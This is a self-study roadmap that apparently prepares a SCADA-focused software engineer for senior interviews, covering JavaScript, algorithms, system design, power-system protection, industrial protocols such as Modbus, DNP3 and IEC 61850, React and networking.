JS Fundamentals
The foundation everything else is built on. Interviewers probe these deeply. You cannot bluff closures at a senior level.
Topic 1 — Closures & scope
What a closure actually isA closure is a function that has access to variables from its outer (enclosing) scope even after that outer function has returned. The inner function "closes over" those variables — they're preserved in memory because the inner function maintains a reference to them. This is not just a definition to memorize — it's the mechanism behind callbacks, event handlers, module patterns, factory functions, and React hooks.
The scope chainWhen a variable is referenced, JavaScript walks the scope chain outward — from local scope → enclosing function scope → module scope → global scope. The first match wins. let and const are block-scoped (scoped to nearest {}). var is function-scoped (scoped to nearest function, ignoring blocks). This distinction is why var in a for loop leaks out of the loop.
HoistingVariable declarations are moved to the top of their scope during compilation — but only declarations, not initializations. var x; is hoisted, x = 5; is not. So console.log(x) before var x = 5 gives undefined, not a ReferenceError. let and const are hoisted to their block but remain in the Temporal Dead Zone until the declaration is reached — accessing them before declaration throws a ReferenceError.
Practical interview questionWhy does this log 3 three times instead of 0, 1, 2? for (var i = 0; i < 3; i++) { setTimeout(() => console.log(i), 0); } Because var is function-scoped — all three callbacks share the same i, which equals 3 by the time they run. Fix: use let (block-scoped, creates new binding per iteration) or use an IIFE to capture the value.
Primary resourcejavascript.info sections 6.1–6.6 (Variable scope, closure). Do every exercise. The "make a counter" and "filter using closure" exercises are exact interview question patterns.
Topic 2 — The this keyword
The rule: this is determined at call time, not at definition timeThis is the most important sentence about this. Except for arrow functions, which don't have their own this — they inherit it lexically from the enclosing scope at definition time. This is why arrow functions are used for event callbacks inside class methods — you want the class's this, not the event target's this.
4 binding rules in priority order(1) New binding: new Foo() — this is the newly created object. (2) Explicit binding: foo.call(obj), foo.apply(obj), foo.bind(obj) — this is obj. (3) Implicit binding: obj.foo() — this is obj. (4) Default binding: foo() — this is undefined in strict mode, globalThis in sloppy mode.
Common mistake in ReactPassing a class method as a callback without binding it — <button onClick={this.handleClick}> loses the class's this when the event fires. Solutions: bind in constructor, use arrow function in JSX (re-creates function on every render), or define as arrow function class field (most modern approach).
Topic 3 — Event loop deep dive
The runtime has three key structures(1) Call Stack — where function execution frames live. LIFO. Single-threaded — only one frame executes at a time. (2) Microtask Queue — holds Promise .then callbacks, async/await continuations, queueMicrotask(), MutationObserver callbacks. (3) Macrotask Queue (Task Queue) — holds setTimeout, setInterval, I/O event callbacks, UI events.
The event loop algorithmExecute the current task on the call stack to completion → drain the ENTIRE microtask queue (every microtask, including any added during draining) → render if needed → take ONE macrotask from the queue → repeat. This is why Promises resolve before setTimeout(fn, 0) even though both are "async".
async/await is syntactic sugarawait suspends the current async function, yielding control back to the event loop. The remainder of the async function is scheduled as a microtask when the awaited Promise resolves. This means await lets the event loop handle other work while waiting — it's non-blocking even though it looks synchronous.
Node.js libuv adds phasestimers → pending callbacks → idle/prepare → poll (waits for I/O) → check (setImmediate) → close callbacks. process.nextTick runs before the microtask queue in Node — a common source of confusion that interviewers love to ask about.
SCADA connectionThis is the same model that makes your Node.js MQTT subscriber work. The event loop handles thousands of concurrent MQTT messages without blocking — each message callback is a macrotask, the InfluxDB write is awaited as a microtask chain. Understanding this lets you explain why your SCADA backend can handle 10,000 sensor readings per second on a single process.
Topic 4 — Prototype chain
Every object has a [[Prototype]]When you access a property on an object and it doesn't exist on the object itself, JavaScript walks the prototype chain — checking the object's prototype, then the prototype's prototype, and so on until it hits null. This is JavaScript's inheritance mechanism.
ES6 classes are syntactic sugar over prototypesclass Foo extends Bar sets up the prototype chain. Foo.prototype inherits from Bar.prototype. Methods defined in the class body are added to the prototype — they're shared across all instances. Properties defined with this.x = ... in the constructor are own properties — each instance gets its own copy.
Interview trapWhat's the difference between Object.create(null) and {}? An object literal has Object.prototype in its chain — it inherits methods like toString, hasOwnProperty. Object.create(null) creates an object with NO prototype — useful for pure dictionaries where you don't want prototype methods accidentally matched by property lookups.

Algorithms & Data Structures
Pattern recognition, not memorization. Every interview problem is one of about 15 patterns.
The 15 patterns — in study order
1
Arrays & Hashmaps
Why first: Covers ~50% of interview problems. Two Sum, Group Anagrams, Contains Duplicate, Valid Anagram. The pattern: use a hashmap to reduce O(n²) brute force to O(n) by trading space for time.
Month 3 — do 15 easy problems on these patterns only. Time yourself. NeetCode Arrays & Hashing section first.
2
Two Pointers
Pattern: Two pointers moving toward each other or in the same direction through an array/string. Valid Palindrome, 3Sum, Container With Most Water. Works when array is sorted or when you need pairs.
Key insight: Avoids nested loops — reduces O(n²) to O(n). Recognize when "finding a pair" can use this.
3
Sliding Window
Pattern: Maintain a window of elements that satisfies some condition, expand right pointer, shrink left pointer when condition violated. Longest Substring Without Repeating Characters, Minimum Window Substring.
When to spot it: "find the longest/shortest subarray/substring that satisfies X" — sliding window.
4
Binary Search
Pattern: Not just searching sorted arrays — binary search on the answer space. "Find minimum/maximum X such that condition is satisfied." Koko Eating Bananas, Find Minimum in Rotated Sorted Array.
Template: lo=0, hi=n, while lo<hi: mid=(lo+hi)//2, if feasible(mid): hi=mid else: lo=mid+1
5
Trees & BFS/DFS
DFS — recursive: Pre-order, in-order, post-order. Maximum Depth, Invert Binary Tree, Lowest Common Ancestor. DFS is natural with recursion — trust the call stack to handle backtracking.
BFS — level order: Use a queue. Level Order Traversal, Minimum Depth, Right Side View. Use when you need "level by level" processing or shortest path in unweighted graph.
6
Graphs
Representations: Adjacency list (most common for interviews). DFS/BFS same as trees but need a visited set to avoid cycles. Number of Islands, Course Schedule, Pacific Atlantic Water Flow.
Union-Find: For connected components problems. Redundant Connection, Number of Connected Components. Learn the template with path compression and union by rank.
7
Dynamic Programming
Start with 1D DP: Climbing Stairs, House Robber, Coin Change. Pattern: define dp[i] as the answer to the subproblem ending at i. Find the recurrence relation. Base case. Fill bottom-up.
Then 2D DP: Unique Paths, Longest Common Subsequence, Edit Distance. Don't try to "see" the DP solution — practice the state definition process until it becomes mechanical.
8
Stack & Queue patterns
Monotonic stack: Maintain a stack of elements in monotonic order (increasing or decreasing). Next Greater Element, Daily Temperatures, Largest Rectangle in Histogram. Recognizing this pattern saves O(n²) brute force.
When to use stack: "find the next greater/smaller element", "validate matching brackets", "evaluate expressions". Stack = last in, first out, problems with "previous state" dependencies.

If you can't solve in 45 min, look at the approach (not the code), try again. Never copy-paste solutions. Goal: pattern recognition, not memorization.

System Design
This is what separates intermediate from senior. Your SCADA background gives you a head start — you already think in distributed systems.
The framework — every system design interview
Step 1 — Clarify requirements (5 min)Ask: What scale? (users, requests/sec, data volume). Read-heavy or write-heavy? Consistency vs availability tradeoff acceptable? Latency requirements? Mobile clients? Before drawing anything, understand what you're building. Interviewers give vague prompts deliberately — clarifying questions show seniority.
Step 2 — Capacity estimation (5 min)Back-of-envelope math. If 100M DAU, each sends 10 messages/day = 1B messages/day = ~12,000 messages/sec. Storage: if each message is 100 bytes, that's 100GB/day. This math shapes your architecture decisions — you now know you need a distributed message queue, not a single DB.
Step 3 — High-level design (10 min)Boxes and arrows. Client → Load Balancer → API Servers → Cache → Database. Don't go deep yet. Get the skeleton right first. What are the main components? How does data flow from user action to persistent storage?
Step 4 — Deep dive (20 min)Pick the most interesting / hardest components and go deep. For a URL shortener: how do you generate short IDs? (Base62 encoding of a counter vs MD5 hash truncation — tradeoffs). For a feed: fan-out on write vs fan-out on read — when to use each. This is where you demonstrate depth.
Step 5 — Identify and address bottlenecks (5 min)Single points of failure? How does it scale to 10x traffic? What breaks first? Database read heavy? → Add read replicas + Redis cache. Hot keys in cache? → Consistent hashing. This shows you think about production, not just the happy path.

Key concepts to master
Caching layersBrowser cache (HTTP Cache-Control) → CDN (Cloudflare edge) → Reverse proxy (Nginx) → Application cache (Redis) → Database cache (disabled in most production DBs). Cache-aside pattern for most use cases: check cache, on miss query DB, populate cache, return. Cache invalidation: TTL (simple but stale), event-based (fresh but complex), versioned cache keys (bust by changing key).
Database choices and when to use themPostgreSQL for relational data with ACID transactions (payments, user accounts). MongoDB for flexible schema, document-based data. Redis for caching, sessions, rate limiting, pub/sub. InfluxDB / TimescaleDB for time-series sensor data (directly from your SCADA work). Elasticsearch for full-text search. Kafka for event streaming and durability. The question is never "which is better" — it's "which fits this access pattern".
Message queuesKafka: durable, ordered log, multiple consumer groups can replay. RabbitMQ: push-based, messages deleted after ack, better for task queues. Bull (Redis-based): simple job queue for Node.js. When to use async messaging: decouple services, absorb traffic spikes, guarantee delivery despite downstream failures. You've built this for your SCADA email notifications — use that experience in interviews.
CAP theorem in plain EnglishIn a distributed system, during a network partition you can choose either Consistency (every read gets the most recent write) or Availability (every request gets a response, even if stale) — you cannot have both. Most real systems choose "eventual consistency" — data propagates to all nodes eventually. Understand CP vs AP systems and when each is appropriate.

Power Systems Engineering
The foundation of everything in energy tech. You can't build meaningful SCADA software without understanding what the data means.
Per-unit system — the language of transmission engineers
Why per-unit existsA transmission network has transformers stepping voltage up and down — 11kV → 33kV → 132kV → 330kV. Analyzing impedances across voltage levels requires converting everything to the same base. Per-unit normalizes all quantities to a common base, making multi-voltage networks tractable.
The calculationChoose base MVA (typically 100 MVA for system studies). Choose base kV at each voltage level (matches transformer ratios). Z_base = (kV_base)² / MVA_base. Z_pu = Z_actual / Z_base. Example: A 132kV, 100 MVA system. Z_base = 132² / 100 = 174.24 Ω. A line impedance of 17.4 Ω = 17.4/174.24 = 0.1 pu.
Why your software needs thisYour SCADA system stores raw measurements from CTs and VTs. When displaying calculated impedances, power flows, or fault currents, you need to correctly apply CT/VT ratios and convert to the display unit the operator expects (kV, A, MW, MVAr). Your backend must handle these conversions correctly — wrong units = wrong operator decisions = equipment damage.
Software applicationIn your Node.js backend, create a unit conversion module: convertToPerUnit(value, base), convertFromPerUnit(pu, base), applyCtRatio(secondaryA, ratio). Every measurement stored in InfluxDB should include its unit as a tag. Display conversions happen at the API response layer, not in the database.
Protection engineering — what the relays are doing
⚡
Overcurrent protection
IDMT formula: t = TMS × K / ((I/Is)^α − 1). Standard Inverse: K=0.14, α=0.02. Very Inverse: K=13.5, α=1.0. Extremely Inverse: K=80.0, α=2.0.
Software use: Your SCADA can calculate expected trip time based on measured fault current and relay settings, and display it alongside actual trip time from the event log. Discrepancy = relay malfunction or wrong settings. This is a genuine diagnostic feature utilities need.
Time-current curves: Plot expected trip times vs current multiples in D3.js. This visualization helps operators verify protection coordination without specialist software.
📏
Distance protection
Principle: Z = V/I. Line impedance is proportional to length. Measuring impedance gives fault distance. Zone 1 = 80% of line, instant trip. Zone 2 = 120%, 400ms. Zone 3 = backup, 1–2s.
R-X plane: Distance relay operates based on apparent impedance plotted on the R-X plane. Mho characteristic = circle passing through origin. Quadrilateral = better for resistive faults. Your SCADA can display this as an interactive D3 chart.
Software use: Calculate apparent impedance Z = V/I from real-time CT/VT measurements. Plot on R-X diagram. Flash when impedance enters Zone 1 or 2 — pre-fault visualization. This is an advanced diagnostic feature no existing affordable SCADA has.
Fault analysis — the calculations your software automates
Three-phase fault (most severe)I_fault = V_prefault / Z_thevenin. This is the maximum fault current — used to set relay high-set elements and verify equipment ratings (breaker interrupting capacity must exceed this).
Single line-to-ground fault (most common)I_fault = 3V / (Z1 + Z2 + Z0). Requires knowledge of zero-sequence impedance Z0 — heavily influenced by transformer earthing arrangement and line configuration. Your software should store Z0 per feeder and calculate SLG fault current automatically from the network model.
Symmetrical components in softwareStore positive, negative, and zero sequence current measurements from the relay (IEDs measure these directly). Negative sequence current > threshold = unbalance alarm. Zero sequence current > threshold = earth fault indicator. Display all three sequence quantities on the HMI alongside the phase quantities.
Auto-reclose logic to displayYour HMI should show reclose state machine: NORMAL → TRIPPED (show which relay element operated) → DEAD TIME (countdown timer) → RECLOSING → SUCCESS or LOCKOUT. Every state transition has a timestamp. Operators need to see this in real time, not just in the event log after the fact.

Protocols & Communications
The physical and data layer of energy tech. Every device in a substation speaks one of these languages — your software must be fluent in all of them.
Modbus — the lingua franca of industrial automation
Architecture: Master/slave. Master polls, slaves respond. One master per bus. Up to 32 devices. Slave addresses 1–247. Master at address 0. Your Python script is the master. The energy meter or RTU is the slave.
Register types: Coils (read/write, 1 bit — for breaker control commands). Discrete inputs (read only, 1 bit — for status like breaker position). Input registers (read only, 16-bit — for measurements). Holding registers (read/write, 16-bit — for setpoints). Know which function code does what: FC01 (read coils), FC02 (read discrete inputs), FC03 (read holding registers), FC04 (read input registers), FC05 (write single coil), FC06 (write single holding register), FC16 (write multiple holding registers).
Modbus RTU (serial): Binary encoding. RS-485 physical layer. Use a USB-RS485 adapter on your laptop or Pi. Data format: [Address][Function][Data][CRC]. 9600 baud for most energy meters. 19200 for faster devices. 115200 for modern RTUs. Always match baud rate, parity, stop bits to device specification.
Modbus TCP (Ethernet): Modbus over TCP/IP. Same register model but accessible over standard Ethernet on port 502. Eliminates RS-485 wiring for devices that have Ethernet ports. Most modern RTUs and IEDs support Modbus TCP in addition to RTU. Your Python script uses pymodbus.client.ModbusTcpClient — connect, read registers, close. Simpler than RTU for development.
Practical task: Download ModRSsim2 (Windows) or use pymodbus's built-in server. Create a simulated Modbus slave that serves fake voltage, current, and power values. Write a Python master that polls it every 2 seconds and prints the values. This is your first real protocol integration.
MQTT — the message bus of your SCADA
📡
Protocol mechanics
Pub/Sub model: Publishers send messages to topics. Subscribers receive from topics. Broker (Mosquitto) is the middleman. Publishers and subscribers never communicate directly — broker decouples them.
QoS levels: QoS 0 = at most once (fire and forget). QoS 1 = at least once (guaranteed, possible duplicates). QoS 2 = exactly once (guaranteed, no duplicates, slowest). Use QoS 1 for alarm events (can handle duplicates in software). QoS 2 for critical commands. QoS 0 for high-frequency measurements.
Topic structure for substations: substations/KAINJI-132/feeders/F1/measurements, substations/KAINJI-132/events/alarms, substations/KAINJI-132/controls/breakers/CB01/command. Hierarchy: site → device group → device → data type. Wildcard subscribe: substations/+/feeders/+/measurements (all feeders at all substations).
🔒
MQTT security (month 11)
TLS encryption: MQTT over TLS on port 8883 instead of plain 1883. Mosquitto config: listener 8883, cafile /etc/mosquitto/ca.crt, certfile /etc/mosquitto/server.crt, keyfile /etc/mosquitto/server.key.
Client authentication: Username/password at minimum. Certificate-based auth for IEDs. Mosquitto ACL file controls which clients can publish/subscribe to which topics. Your control commands topic should allow publish only from authenticated engineering workstations.
Will messages: Set a "last will" message when connecting. If the client disconnects unexpectedly, the broker publishes this message. Use it to set a device's status to "OFFLINE" automatically when its connection drops.
DNP3 — the utility SCADA standard
Why DNP3: Most Nigerian utility RTUs (Remote Terminal Units) speak DNP3. It was designed specifically for SCADA — it has timestamped events, unsolicited reporting (RTU pushes data to master on change, rather than waiting to be polled), data integrity polling (class polls), and binary/analog/counter object types. More sophisticated than Modbus for utility applications.
Key concepts: Master (your SCADA software) and Outstation (the RTU/IED). Data objects organized by class: Class 0 = static data (current values), Class 1 = highest priority events, Class 2 = medium priority, Class 3 = lower priority. Integrity poll = request all static + all queued events. Unsolicited reporting = outstation sends Class 1/2/3 events to master without being asked.
Implementation (month 15): Use pydnp3 Python library. Build a DNP3 master that can connect to an outstation simulator (use Triangle MicroWorks DNP3 Simulator). Perform integrity poll on connection, then process unsolicited responses. Map received data objects to your InfluxDB schema — same pipeline as Modbus, different entry point.
Business value: Being able to connect to DNP3 RTUs means your SCADA can talk to existing utility infrastructure without replacing hardware. This dramatically reduces the cost of your solution for DISCOs — they don't need to replace their RTUs, they just need your software layer on top.

IEC 61850 Deep Dive
The most important protocol for transmission work. Complex but transformative — it's the difference between connecting to a meter and integrating with a real IED.
The data model hierarchy
Physical Device (IED)The actual relay hardware. e.g. PROT_IED_01. One IP address, one device. An IED may contain multiple Logical Devices.
Logical Device (LD)A functional grouping within an IED. e.g. PROT (protection functions), MEAS (measurement functions), CTRL (control functions). An IED may have 2–10 LDs.
Logical Node (LN)A standardized function block. Named with 4-character codes: PDIS = Distance Protection, XCBR = Circuit Breaker, MMXU = Measurements (3-phase), GAPC = Generic Automatic Process Control, CILO = Interlocking. Over 90 standardized LN types. The standardization is why IEDs from different vendors can be integrated — they all expose MMXU1.PhV.phsA.mag.f for Phase A voltage.
Data Object (DO)A named group of related data attributes within an LN. Op (Operate — trip output), Pos (Position — breaker state), PhV (Phase Voltages), A (Phase Currents).
Data Attribute (DA)The actual value. stVal (status value — boolean, enum), mag.f (magnitude as float), t (timestamp of last change), q (quality — validity, test mode, source).
Full path examplePROT_IED_01/PROT/PDIS1.Z1F.mag.f = Physical device PROT_IED_01, Logical device PROT, LN PDIS1 (Distance Zone 1), DO Z1F (Zone 1 forward reach), DA mag.f (magnitude as float). This path uniquely identifies a single data point anywhere in a substation.
GOOSE messaging — the fast lane
What makes GOOSE special: Layer 2 Ethernet multicast — it does NOT use IP or TCP. No routing delays. Latency under 4ms. Used for protection signals that need to be ultra-fast: inter-trip between relays, busbar protection trip commands, interlocking signals. Cannot be routed over WAN — only works within one Ethernet LAN segment (or extended via L2 VPN).
Retransmission pattern: GOOSE publishes continuously. On state change: retransmit at 2ms, 2ms, 4ms, 8ms, 16ms... doubling until max interval (typically 1000ms heartbeat). This flooding on change ensures reliable delivery without TCP acknowledgment. On the receiving side, you track the sqNum (sequence number) to detect missed messages.
In your SCADA: Subscribe to GOOSE messages on your network interface using libiec61850's GooseSubscriber. Trip signals arrive in under 4ms. Log the exact timestamp (from the GOOSE message itself, not your system clock — IED timestamps are synchronized by GPS or IEEE 1588 PTP). Display in the HMI event log with microsecond precision.
SCL configuration files
📄
File types
ICD — IED Capability Description. Supplied by manufacturer with the relay. Describes everything the IED can do — all its LDs, LNs, DOs, DAs, and what GOOSE signals it can publish/subscribe.
SSD — System Specification Description. Describes the substation topology — busbars, bays, connected equipment. Drawn by the protection engineer during substation design.
SCD — Substation Configuration Description. The complete configured system. Combines all ICD files + SSD. Shows which IED connects to which, which GOOSE signals are wired to which inputs. This is what you import into your SCADA to understand the full substation.

Approach: Train a Random Forest or XGBoost model on historical load data (from your InfluxDB) with features: hour of day, day of week, month, temperature, public holiday flag. Forecast next 24 hours. Update hourly with actual data. Accuracy within 5–10% is achievable and genuinely useful.

Problem: Recurring faults on a line often indicate a developing insulation problem, vegetation encroachment, or hardware degradation. Identifying these patterns before failure prevents outages.

Business value: This analysis currently requires specialist consultants. Your platform provides it automatically. Show the client their "top 5 most problematic line sections" and it immediately demonstrates value.

Problem: Nigerian DISCOs have commercial losses (theft) and technical losses (line resistance, transformer core loss). Distinguishing them and locating them is difficult without proper metering and analysis.
Approach: Compare energy injected at substation with energy billed at customer meters. Map the difference geographically. Statistical anomaly detection on feeder load patterns to flag potential theft locations (sudden drops in measured load without corresponding billing changes).

React & Frontend Deep Dive
You're building real products. This track takes your practical React knowledge and adds the interview-level depth that big tech expects.
React internals — what interviews actually test
Reconciliation — how React decides what to updateEvery state change triggers a re-render. React calls your component function, gets a new element tree (virtual DOM), and diffs it against the previous tree. Only differences are applied to the real DOM. The diffing algorithm is O(n) — it assumes: (1) different element types produce entirely different trees, (2) keys identify which list elements are stable. Without stable keys, React can't tell what changed — it destroys and recreates DOM nodes unnecessarily, losing input state and causing flickers.
React Fiber — the concurrent modelReact 16+ represents work as a linked list of "fiber" nodes. Unlike the old stack-based reconciler, fibers can be paused, resumed, and prioritized. This is what enables Concurrent Mode (React 18) — rendering can be interrupted by higher-priority updates (like user keystrokes), preventing the UI from freezing during expensive renders. Your SCADA alarm system benefits from this — incoming alarm WebSocket messages are high-priority, ongoing chart renders are low-priority.
Hooks at the fiber leveluseState stores its state in a linked list attached to the fiber node. The order of hooks must be stable across renders — this is why you cannot call hooks conditionally. useEffect schedules its effect callback to run after the DOM is committed. The cleanup function runs before the next effect or on unmount. Your WebSocket hook's cleanup function must close the connection — otherwise you get multiple open connections leaking on every re-render.
useMemo and useCallback — when they actually helpThese memoize values and functions across renders. They're useful when: (1) the memoized value is expensive to compute, or (2) the value is a reference type (object/function) passed to a child component wrapped in React.memo. They're NOT useful for simple primitive computations — the memoization overhead costs more than the computation. Most premature optimization in React is people adding useMemo everywhere "just in case".
Context API — for what it's designed forContext is for data that needs to be accessible across many components at various depths without prop drilling: current user, theme, locale, feature flags. It's NOT a substitute for state management. Every consumer re-renders when context value changes — put fast-changing data in local state or a store, not context. Pattern: split context into "data context" and "actions context" to prevent unnecessary re-renders from components that only need actions.
Performance optimization — what big tech asks
🚀
Core Web Vitals
LCP (Largest Contentful Paint) target: under 2.5s Preload hero images, use WebP, serve from CDN, inline critical CSS. Your SCADA HMI loads fast because there's no hero image — LCP is the first chart data render.
INP (Interaction to Next Paint) target: under 200ms Long JavaScript tasks block the main thread. Break heavy computations into chunks with setTimeout(fn, 0). Use Web Workers for COMTRADE parsing (large binary files) — keeps the UI responsive.
CLS (Cumulative Layout Shift) target: under 0.1 Reserve space for dynamically loaded content. Your SCADA charts have fixed height containers — no layout shift when data loads.
📦
Bundle optimization
Code splitting: Route-based splitting with React.lazy + Suspense. Each route loads its own chunk. The SCADA HMI's COMTRADE waveform viewer is a heavy component — lazy load it so operators who never use it don't download its code.
Tree shaking: Import specifically — import { LineChart } from 'recharts' not import recharts from 'recharts'. Webpack/Vite eliminate unused exports. Lodash: import debounce from 'lodash/debounce' not import _ from 'lodash'.
Immutable assets: Content-hash filenames (Vite does this by default). Set Cache-Control: max-age=31536000, immutable. Browser caches forever — new deploy = new hash = new URL = automatic cache bust.
SSR / Next.js — the rendering strategy question
CSR (Client-Side Rendering): HTML shell + JS bundle → browser renders. Fast navigation after load, slow initial paint. Use for: SPAs behind auth, dashboards, apps where SEO doesn't matter. Your SCADA HMI is pure CSR — it's behind login, SEO is irrelevant, rich interactivity needed.
SSR (Server-Side Rendering): Server renders HTML per request, sends to browser. Browser hydrates. Fast initial paint, SEO-friendly, server bears load. Use for: e-commerce, news, marketing sites. Next.js pages with getServerSideProps.
SSG (Static Site Generation): HTML rendered at build time, served from CDN. Fastest possible load. Data can be stale. Use for: marketing sites, blogs, documentation. Your energy company's public website is SSG.
ISR (Incremental Static Regeneration): Pages statically generated, regenerated in background after configurable TTL. Users always get cached page — fresh data within TTL. Use for: product catalogs, news, anything that changes but doesn't need real-time. export const revalidate = 60; in Next.js App Router.
React Server Components (Next.js 13+ App Router): Components that render ONLY on server — zero client JS bundle impact, can query DB directly, cannot use hooks or browser APIs. Interleaved with client components. The distinction: server components = data fetching + static rendering. Client components = interactivity + state + effects. Your SCADA HMI cannot use RSC for the live data parts — those need client-side state. But the static layout, navigation, and auth shell can be RSC.

Interview Preparation
The interview is a separate skill from engineering. Practice it deliberately. Rejection is data, not failure.
The interview loop structure at big tech
Phone screen (30–45 min)Usually with a recruiter first (behavioral, resume, salary), then a technical screen with an engineer (1 coding problem, medium difficulty, shared code editor). Goal: qualify for on-site. Pass rate: ~30–50%.
On-site / Virtual on-site (4–6 rounds)Typically: 2 coding rounds (1 medium + 1 harder), 1 system design round, 1–2 behavioral rounds, possibly a domain-specific round (frontend performance, Node.js architecture). Each round is 45–60 min. All rounds same day or across 2 days.
Hiring committee / DebriefAll interviewers submit written feedback with a recommendation. A hiring committee (often people who didn't interview you) reviews all feedback and makes the final call. This is why one bad round doesn't always kill an offer — strong performance across other rounds can compensate.
Offer and negotiationInitial offer is rarely the best offer. Counter with competing offers if you have them (best leverage) or market data from levels.fyi. Most companies have a 10–20% negotiation range. Base salary, sign-on bonus, and equity vesting schedule are all negotiable. Get everything in writing before verbally accepting.
Behavioral interviews — the STAR framework
STAR = Situation, Task, Action, ResultEvery behavioral answer follows this structure. Situation (1–2 sentences): set the context briefly. Task (1 sentence): what was your specific responsibility. Action (3–5 sentences): what YOU did — not "we", not "the team". This is what they're evaluating. Result (1–2 sentences): quantified outcome where possible. Total answer: 2–3 minutes max.
5 stories you must have ready(1) Technical challenge you solved — show how you diagnosed, your approach, the outcome. (2) Conflict or disagreement with a teammate or manager — show you can handle it professionally and reach resolution. (3) Time you failed or made a mistake — show self-awareness and what you learned. (4) Time you led something (even without a title) — show initiative. (5) Time you had to learn something quickly — shows adaptability. Practice these aloud until they're fluent.

Networking
TCP/IP, DNS, HTTP, load balancers, CDN, subnetting — the plumbing of everything you build. Both big tech interviews and SCADA deployments require this deeply.
OSI model — where everything maps
Layer 1 — PhysicalBits on a wire. Ethernet cables, fiber optic, RS-485 twisted pair. In SCADA: RS-485 is the physical layer for Modbus RTU. 120-ohm termination at each end of the bus. Daisy-chain topology only — no star wiring. Max 1200m at 9600 baud.
Layer 2 — Data LinkFrames between devices on the same network segment. MAC addresses, Ethernet, VLANs, switches. In SCADA: IEC 61850 GOOSE messages operate at Layer 2 — no IP, no routing, multicast MAC addresses. This is why GOOSE cannot cross routers or traverse the internet — it is substation-LAN-only.
Layer 3 — NetworkIP packets routed between networks. IPv4 (32-bit), IPv6 (128-bit), subnetting, CIDR notation, routing tables, NAT. Understanding subnetting is required for both SCADA substation network design and cloud VPC architecture.
Layer 4 — TransportTCP: connection-oriented, reliable, ordered delivery, flow control. Three-way handshake: SYN → SYN-ACK → ACK. UDP: connectionless, no delivery guarantee, low latency. MQTT runs over TCP. DNP3 runs over TCP or UDP. HTTP runs over TCP. DNS queries use UDP (small) and TCP (large responses, zone transfers).
Layer 7 — ApplicationHTTP, HTTPS, WebSocket, MQTT, Modbus TCP, IEC 61850 MMS, DNP3/TCP. The protocols your code directly interacts with. Choosing the right L7 protocol is a software architecture decision — WebSocket for push, REST for request-response, MQTT for pub/sub IoT, MMS for IED data.
TCP/IP deep — what big tech interviews test
🔄
TCP internals
Three-way handshake: Client SYN (seq=X) → Server SYN-ACK (ack=X+1, seq=Y) → Client ACK (ack=Y+1). Connection established. Both sides track sequence numbers independently for ordered reassembly of out-of-order packets.
Flow control: Receiver advertises window size — how many bytes it can buffer before the sender must stop. Prevents fast sender from overwhelming slow receiver. Window size shrinks under load, grows as buffer empties.
Congestion control: Slow start — TCP probes bandwidth by doubling window size until a packet is lost, then backs off. This is why a single TCP connection does not saturate a link instantly. Relevant when explaining why HTTP/2 multiplexing over one TCP connection can still be bottlenecked by a single packet loss.
TIME_WAIT: After closing, connections linger for 2×MSL (~120s). Prevents delayed packets from old connections being mistaken for new ones. High-volume servers exhaust ports from TIME_WAIT — mitigated with SO_REUSEADDR and connection pooling (never open/close a DB connection per request).
🌐
HTTP versions
HTTP/1.1: Text-based. One outstanding request per connection (with keep-alive reuse). Browsers work around this by opening 6 parallel connections per origin. Head-of-line blocking: one stalled request blocks subsequent requests on that connection.
HTTP/2: Binary-framed. Multiplexed — multiple requests simultaneously over one TCP connection, no HOL blocking at HTTP layer. Header compression (HPACK). Still has TCP-level HOL blocking — a single dropped packet stalls all streams.
HTTP/3 + QUIC: Runs over UDP with its own reliable delivery. Eliminates TCP HOL blocking entirely — each stream is independent at transport layer. 0-RTT reconnection. Handles IP address changes (mobile handoff) without reconnecting. The future of high-performance web.
WebSocket upgrade: Starts as HTTP GET with Upgrade: websocket header. Server responds 101 Switching Protocols. From that point: full-duplex, frame-based, persistent connection. Your SCADA HMI uses WSS (WebSocket Secure over TLS) — never unencrypted WebSocket in production.
DNS — every lookup before every connection
Resolution chain: Browser cache → OS cache + /etc/hosts → Recursive resolver (ISP or 8.8.8.8 or 1.1.1.1) → Root nameserver → TLD nameserver → Authoritative nameserver → A record returned and cached. Total round-trips: 0 (all cached) to 4 (full cold resolution). Average: 1 round-trip to recursive resolver cache.
Critical record types: A (name → IPv4), AAAA (name → IPv6), CNAME (alias → name, cannot be at zone apex), MX (mail routing with priority), TXT (SPF/DKIM for email, domain verification), NS (authoritative nameservers), SRV (service + port for service discovery), CAA (which CAs may issue certs for domain).
TTL strategy for deployments: Lower TTL to 60s a day before a planned DNS change. Make change. Wait for propagation (max 60s now). Raise TTL back to 3600. Never change DNS records with high TTL and wonder why it hasn't propagated — cached resolvers serve stale records for the full TTL duration.
In Kubernetes: CoreDNS provides internal DNS. Service named node-backend in namespace prod resolves to node-backend.prod.svc.cluster.local. Your Python gateway pods reach the MQTT broker by name, not IP — IPs change when pods restart, names don't. Always use service names in your SCADA configuration, never hardcoded IPs.
Subnetting for SCADA network design
CIDR notation: 192.168.10.0/24 — first 24 bits are network, last 8 are hosts. /24 = 256 addresses (254 usable). /25 = 128. /26 = 64. /27 = 32. /28 = 16. /29 = 8. /30 = 4 (2 usable — for point-to-point links). Memorize these — you should answer "how many hosts in a /27?" in under 3 seconds.
Substation VLAN design (from your SCADA roadmap): VLAN 10 — Process bus 192.168.10.0/24: IED-to-IED GOOSE and Sampled Values traffic. Fully isolated, no internet access, no corporate access. VLAN 20 — Station bus 192.168.20.0/24: IED-to-SCADA MMS, RTU-to-SCADA DNP3. Read-only access from VLAN 30 only. VLAN 30 — Corporate 192.168.30.0/24: Engineering workstations, outbound internet access, no inbound to VLAN 10/20. VLAN 99 — Management 192.168.99.0/24: Switch management interfaces, restricted to authorized administrators only.
Cloud VPCs use the same concepts: AWS VPC: private subnets (no internet gateway — for RDS, ElastiCache, ECS tasks), public subnets (internet gateway — for load balancers only). NAT gateway lets private subnet reach internet outbound. Security groups = stateful instance-level firewall. NACLs = stateless subnet-level ACLs. Your SCADA on AWS: load balancer in public subnet, Node.js ECS tasks in private subnet, RDS and ElastiCache in private subnet — nothing in the backend directly reachable from the internet.
Load balancers and CDN
⚖️
Load balancers
L4 LB (Transport): Routes by IP + port. No content inspection. Faster. Use for: high-throughput TCP services, non-HTTP protocols (your MQTT broker on port 8883 behind AWS NLB for DDoS protection).
L7 LB (Application): Routes by HTTP headers, URL paths, cookies. SSL termination. Sticky sessions. WebSocket support (passthrough of Upgrade header). AWS ALB, Nginx, HAProxy. Use for: your SCADA REST API and WebSocket server — same ALB handles both, routing /api/* to the Node.js service and WSS connections to the WebSocket service.
Health checks: ALB sends GET /health every 30s. Your Node.js backend /health checks DB and Redis connectivity, returns 200 if healthy. Return 503 when shutting down — ALB drains existing connections before removing from rotation. This enables zero-downtime deployments.
